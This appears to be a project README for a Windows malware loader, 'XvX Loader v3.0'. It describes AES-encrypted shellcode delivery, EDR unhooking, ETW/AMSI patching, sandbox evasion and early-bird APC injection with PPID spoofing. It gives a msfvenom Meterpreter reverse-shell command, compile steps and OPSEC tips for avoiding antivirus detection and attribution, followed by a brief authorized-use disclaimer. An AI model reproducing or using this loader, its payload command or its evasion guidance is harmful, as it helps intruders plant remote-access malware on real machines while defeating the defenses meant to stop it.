# XvX Loader v3.0

Multi-stage Windows shellcode loader designed for red team operations. Implements AES-256-CBC encryption, EDR unhooking, indirect syscalls, ETW/AMSI bypass, and sandbox evasion to deliver payloads stealthily.

## Overview

XvX Loader is a production-ready malware loader that injects encrypted shellcode (Meterpreter, Cobalt Strike beacons, custom payloads) into legitimate Windows processes. Built with a modular architecture, it chains multiple evasion techniques to bypass modern security solutions.

**Core capabilities:**
- **AES-256-CBC Encryption**: Offline payload encryption with random key/IV per build (Windows CryptoAPI)
- **EDR Unhooking**: Fresh NTDLL restoration from disk, bypassing userland hooks planted by security products
- **Indirect Syscalls**: Direct kernel calls via dynamically resolved SSNs, avoiding hooked WinAPI functions
- **ETW Bypass**: Runtime patching of EtwEventWrite/EtwEventWriteEx to suppress telemetry logs
- **AMSI Neutralization**: Disables Windows Antimalware Scan Interface to evade PowerShell/script detection
- **Sandbox Evasion**: Multi-layer checks (VM artifacts, RAM/CPU/disk validation, uptime analysis, user activity)
- **APC Injection**: Early-bird technique with suspended process creation and thread resumption
- **PPID Spoofing**: Fakes parent process as explorer.exe for process tree legitimacy
- **String Obfuscation**: Syscall names obscured (SysAllocMem, SysWriteMem) to defeat static analysis

**Technical highlights:**
- Silent execution (no console window)
- Minimal footprint (67 KB stripped binary)
- Compiles with GCC/MinGW (no Visual Studio required)
- Dynamic SSN resolution from clean NTDLL copy
- RWX memory allocation via NtAllocateVirtualMemory syscall
- Target process: rundll32.exe (stable, minimal dependencies)

## Architecture

```
loader_v3.c          - Main entry point
build.ps1            - Automated build script
tools/               - AES encryptor for payloads
modules/
  ├── crypto.c       - AES-256-CBC (encrypt/decrypt)
  ├── injection.c    - APC injection + PPID spoofing
  ├── unhooking.c    - Clean NTDLL restoration
  ├── etw_bypass.c   - Disable ETW telemetry
  ├── amsi_bypass.c  - Neutralize AMSI (anti-powershell)
  ├── sandbox_evasion.c - VM/sandbox detection
  └── syscalls.c     - Indirect syscalls (bypass hooks)
```

## Quick build

```powershell
# 1. Generate payload on Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 EXITFUNC=thread -f raw -o meterpreter.bin

# 2. Copy to payload/
# 3. Compile
.\build.ps1

# Result: output\Loader.exe (67 KB, silent, stripped)
```

## How it works

**Stage 1: Sandbox evasion**
- Check VM (VMware, VirtualBox, Hyper-V)
- Verify RAM/CPU/disk (sandboxes often have 2GB RAM, 2 CPUs)
- Uptime > 10 min (sandbox timeout usually 5 min)

**Stage 2: Unhooking**
- Load fresh copy of ntdll.dll from C:\Windows\System32
- Replace .text section in memory (where EDR hooks live)
- Flush instruction cache

**Stage 3: ETW/AMSI bypass**
- Patch EtwEventWrite (Windows telemetry)
- Patch AmsiScanBuffer if loaded

**Stage 4: Injection**
- Create rundll32.exe in suspended mode
- PPID spoofing to explorer.exe (looks legit)
- Allocate RWX memory with direct syscall
- Write shellcode
- APC on main thread
- Resume → shellcode executes

## Manual compilation

```powershell
# DEBUG (console visible, for testing)
gcc -O0 loader_v3.c modules\*.c modules\dosyscall.o -o Loader_DEBUG.exe -ladvapi32 -lntdll -luser32

# PROD (silent, optimized, stripped)
gcc -O2 -DPRODUCTION loader_v3.c modules\*.c modules\dosyscall.o -o Loader_PROD.exe -ladvapi32 -lntdll -luser32 -mwindows -s
```

## OPSEC

**Do:**
- Test on filescan.io or antiscan.me (NOT VirusTotal which shares with AVs)
- Change payload per target (rotate AES keys)
- Check connection: `netstat -ano | findstr <port>`
- Kill rundll32.exe process after use

**Don't:**
- Upload to VirusTotal (burns the signature)
- Reuse same binary on multiple targets
- Leave traces (payload.bin on disk)
- Default LHOST/LPORT (192.168.1.100:4444 = obvious)

## Detection

**What's mitigated:**
- Syscall strings obfuscated (SysAllocMem instead of NtAllocateVirtualMemory)
- No suspicious imports (everything via syscalls)
- ETW patched (no telemetry logs)
- EDR hooks bypassed

**What's still visible:**
- High entropy (AES-256 = random data)
- RWX memory allocation (required for shellcode)
- Injection behavior (detectable by advanced EDR)
- Orphan rundll32.exe process (no parameters)

## Known issues

If `dosyscall.o` missing after cleanup:
```powershell
cd modules
gcc -c dosyscall.S -o dosyscall.o
```

If loader gets killed by Kaspersky/Defender during testing:
- Add folder exclusion in AV
- Compile with `-DPRODUCTION` (disables printf that can trigger)

## Contact

28Zaakypro@proton.me

**Disclaimer:** Authorized red team / pentest only. Illegal use = your responsibility.
